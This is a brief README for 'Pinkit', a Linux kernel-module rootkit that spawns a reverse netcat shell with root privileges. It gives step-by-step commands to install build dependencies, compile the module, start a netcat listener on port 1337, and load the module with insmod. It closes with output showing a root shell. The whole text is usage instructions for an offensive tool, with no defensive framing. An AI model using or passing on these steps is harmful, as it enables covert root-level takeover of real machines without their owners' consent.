# Pinkit
A quick LKM rootkit that executes a reverse netcat shell with root privileges.

INSTALL
[Dependencies]
apt install build-essential linux-headers-$(uname -r)

[Compile Kernel Module]
cd Pinkit; make

[Execute Reverse Shell]
# nc must be installed
nc -lvp 1337 <- Run netcat listener in another shell
insmod pinkit.ko <- Load LKM
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root)
